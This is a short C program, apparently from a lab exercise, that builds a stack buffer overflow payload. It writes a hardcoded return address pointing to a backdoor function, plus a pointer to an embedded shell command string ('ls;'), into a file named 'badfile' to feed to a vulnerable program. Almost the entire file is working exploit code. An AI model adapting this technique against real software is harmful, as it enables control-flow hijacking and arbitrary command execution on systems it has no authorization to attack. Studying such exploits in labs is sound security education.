#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUF_SIZE 1024
#define uint unsigned int

const char code[] = "ls;";
uint bdoor_addr = 0x5659a63d;
uint buf_addr = 0xffafa450;

int main(){
    char buf[BUF_SIZE];
    FILE *badfile;

    printf("Stack overflow volnerability starting up...\n");
    
    memset(buf, 'x', sizeof(buf));
    *(uint *)(&buf[44]) = bdoor_addr;
    *(uint *)(&buf[52]) = buf_addr + 68;
    memcpy(&buf[68], code, strlen(code)); // ls;
    buf[BUF_SIZE-1] = '\0'; // end
    // printf("%s\n", buf);

    badfile = fopen("badfile", "w+");
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
    
    printf("Stack overflow function returned\n");
}
